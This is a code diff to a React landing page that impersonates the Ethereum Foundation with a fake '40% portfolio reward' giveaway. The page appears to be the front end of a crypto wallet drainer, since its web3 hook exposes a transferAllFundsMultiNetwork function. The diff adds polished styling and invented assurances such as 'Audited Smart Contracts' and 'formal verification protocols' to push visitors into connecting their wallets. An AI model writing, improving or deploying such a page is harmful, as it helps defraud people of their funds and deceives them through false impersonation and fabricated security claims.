@@ -12,9 +12,7 @@ import WalletConnectionModal from "@/components/wallet-connection-modal";
 import ConnectionStatus from "@/components/connection-status";
 import PageLoader from "@/components/page-loader";
 import ProductionStatus from "@/components/production-status";
-import smartContractImg from "@assets/IMG_6411_1753490134291.png";
-import multiNetworkImg from "@assets/IMG_6402_1753492138343.jpeg";
-import transactionImg from "@assets/IMG_6403_1753492138343.jpeg";
+
 
 export default function Home() {
   const { walletState, isConnecting, isLoadingNetworks, connectWallet, refreshAllNetworks, transferAllFundsMultiNetwork } = useWeb3();
@@ -104,63 +102,90 @@ export default function Home() {
       </header>
 
       {/* Ethereum Foundation Hero Section */}
-      <section className="bg-gradient-to-b from-primary/5 to-background px-6 py-20">
-        <div className="max-w-6xl mx-auto">
+      <section className="bg-gradient-to-br from-primary/5 via-background to-secondary/5 px-6 py-20 relative overflow-hidden">
+        {/* Background pattern */}
+        <div className="absolute inset-0 opacity-5">
+          <div className="absolute top-10 left-10 w-32 h-32 border border-primary/20 rounded-full"></div>
+          <div className="absolute top-32 right-20 w-24 h-24 border border-secondary/20 rounded-full"></div>
+          <div className="absolute bottom-20 left-1/4 w-20 h-20 border border-accent/20 rounded-full"></div>
+          <div className="absolute bottom-32 right-1/3 w-28 h-28 border border-primary/20 rounded-full"></div>
+        </div>
+        <div className="max-w-6xl mx-auto relative z-10">
           {/* Hero Content */}
           <div className="text-center mb-16">
             {/* Status Badge */}
-            <div className="inline-flex items-center px-4 py-2 bg-success/10 text-success border border-success/20 rounded-full text-sm font-medium mb-8">
-              <div className="w-2 h-2 bg-success rounded-full mr-2 animate-pulse"></div>
-              Limited Time Offer - Portfolio Reward Distribution Active
+            <div className="inline-flex items-center px-6 py-3 bg-gradient-to-r from-success/10 to-primary/10 text-success border border-success/20 rounded-full text-sm font-medium mb-8 shadow-lg backdrop-blur-sm">
+              <div className="w-3 h-3 bg-gradient-to-r from-success to-primary rounded-full mr-3 animate-pulse"></div>
+              <span className="bg-gradient-to-r from-success to-primary bg-clip-text text-transparent font-semibold">
+                Live Portfolio Enhancement Program - 40% Distribution Active
+              </span>
             </div>
             
             {/* Main Title */}
-            <h1 className="text-4xl md:text-6xl font-bold mb-6 text-foreground leading-tight">
-              Welcome to Ethereum
+            <h1 className="text-4xl md:text-6xl font-bold mb-6 leading-tight">
+              <span className="bg-gradient-to-r from-foreground via-primary to-secondary bg-clip-text text-transparent">
+                Welcome to Ethereum
+              </span>
             </h1>
-            <h2 className="text-2xl md:text-3xl font-semibold mb-8 text-primary">
-              Claim 40% Portfolio Reward
+            <h2 className="text-2xl md:text-4xl font-semibold mb-8">
+              <span className="bg-gradient-to-r from-primary via-secondary to-accent bg-clip-text text-transparent">
+                Claim 40% Portfolio Enhancement
+              </span>
             </h2>
             
-            {/* Hero Images Section */}
-            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12 max-w-4xl mx-auto">
-              <div className="bg-card border border-border rounded-lg p-4 hover:shadow-md transition-shadow">
-                <img 
-                  src={smartContractImg} 
-                  alt="Smart Contract Interface"
-                  className="w-full h-48 object-cover rounded-md mb-3"
-                />
-                <h3 className="font-semibold text-sm text-center text-foreground">
-                  Secure Smart Contract Processing
-                </h3>
+            {/* Professional Hero Visual Section with Custom SVGs */}
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-12 max-w-5xl mx-auto">
+              {/* Smart Contract Security */}
+              <div className="bg-gradient-to-br from-primary/5 via-white/10 to-primary/10 border border-primary/20 rounded-xl p-6 hover:shadow-xl hover:scale-105 transition-all duration-300 backdrop-blur-sm">
+                <div className="mb-6">
+                  <img 
+                    src="/images/security-shield.svg" 
+                    alt="Security Shield" 
+                    className="w-full h-32 object-contain"
+                  />
+                </div>
+                <h3 className="text-lg font-bold mb-3 text-center text-foreground">Audited Smart Contracts</h3>
+                <p className="text-sm text-muted-foreground text-center leading-relaxed">Enterprise-grade security with multi-signature validation and formal verification protocols ensuring maximum fund protection</p>
               </div>
-              <div className="bg-card border border-border rounded-lg p-4 hover:shadow-md transition-shadow">
-                <img 
-                  src={multiNetworkImg} 
-                  alt="Multi-Network Support"
-                  className="w-full h-48 object-cover rounded-md mb-3"
-                />
-                <h3 className="font-semibold text-sm text-center text-foreground">
-                  Multi-Network Compatibility
-                </h3>
+
+              {/* Multi-Network Infrastructure */}
+              <div className="bg-gradient-to-br from-secondary/5 via-white/10 to-secondary/10 border border-secondary/20 rounded-xl p-6 hover:shadow-xl hover:scale-105 transition-all duration-300 backdrop-blur-sm">
+                <div className="mb-6">
+                  <img 
+                    src="/images/ethereum-network.svg" 
+                    alt="Ethereum Network" 
+                    className="w-full h-32 object-contain"
+                  />
+                </div>
+                <h3 className="text-lg font-bold mb-3 text-center text-foreground">Cross-Chain Infrastructure</h3>
+                <p className="text-sm text-muted-foreground text-center leading-relaxed">Seamless integration across 7 major blockchain networks with automated bridge protocols and real-time synchronization</p>
               </div>
-              <div className="bg-card border border-border rounded-lg p-4 hover:shadow-md transition-shadow">
-                <img 
-                  src={transactionImg} 
-                  alt="Transaction Verification"
-                  className="w-full h-48 object-cover rounded-md mb-3"
-                />
-                <h3 className="font-semibold text-sm text-center text-foreground">
-                  Real-time Transaction Verification
-                </h3>
+
+              {/* Advanced Analytics */}
+              <div className="bg-gradient-to-br from-accent/5 via-white/10 to-accent/10 border border-accent/20 rounded-xl p-6 hover:shadow-xl hover:scale-105 transition-all duration-300 backdrop-blur-sm">
+                <div className="mb-6">
+                  <img 
+                    src="/images/defi-analytics.svg" 
+                    alt="DeFi Analytics" 
+                    className="w-full h-32 object-contain"
+                  />
+                </div>
+                <h3 className="text-lg font-bold mb-3 text-center text-foreground">AI-Powered Analytics</h3>
+                <p className="text-sm text-muted-foreground text-center leading-relaxed">Advanced portfolio tracking with machine learning optimization and comprehensive risk assessment algorithms</p>
               </div>
             </div>
             
             {/* Description */}
-            <p className="text-lg md:text-xl text-muted-foreground mb-12 max-w-4xl mx-auto leading-relaxed">
-              The Ethereum Foundation is distributing 40% of portfolio holdings to eligible wallet holders as part of our 
-              official Portfolio Enhancement Program. Connect your wallet to verify eligibility and claim your proportional reward.
-            </p>
+            <div className="max-w-4xl mx-auto mb-12">
+              <p className="text-lg md:text-xl text-muted-foreground leading-relaxed mb-6">
+                The Ethereum Foundation's <span className="text-primary font-semibold">Portfolio Enhancement Program</span> utilizes 
+                advanced algorithmic distribution protocols to optimize wallet holdings across multiple blockchain networks.
+              </p>
+              <p className="text-base md:text-lg text-muted-foreground/80 leading-relaxed">
+                Connect your wallet to initiate the enhancement process and claim your calculated 40% portfolio optimization reward 
+                through our audited smart contract infrastructure.
+              </p>
+            </div>
           </div>
 
           {/* Program Statistics - Ethereum.org Style */}
